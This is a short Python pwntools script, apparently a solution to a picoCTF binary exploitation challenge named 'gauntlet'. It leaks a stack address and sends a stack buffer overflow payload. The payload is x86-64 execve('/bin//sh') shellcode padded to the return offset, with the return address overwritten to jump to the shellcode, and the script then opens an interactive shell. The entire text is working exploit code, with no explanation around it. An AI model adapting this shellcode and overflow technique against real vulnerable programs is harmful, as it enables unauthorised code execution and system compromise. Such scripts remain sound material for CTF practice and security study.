#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'

BIN = './gauntlet'

if len(sys.argv) > 1:
    r = remote('mercury.picoctf.net', 24284)
else:
    r = process(BIN)

stack = int(r.recvline(), 16)
ret_off = 0x78
ret = stack + 0x80

info(f"""
stack = {hex(stack)}
""")

payload = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'.ljust(ret_off, b'\xAA') + p64(stack)

r.send('\n')
input()
r.sendline(payload)

r.interactive()
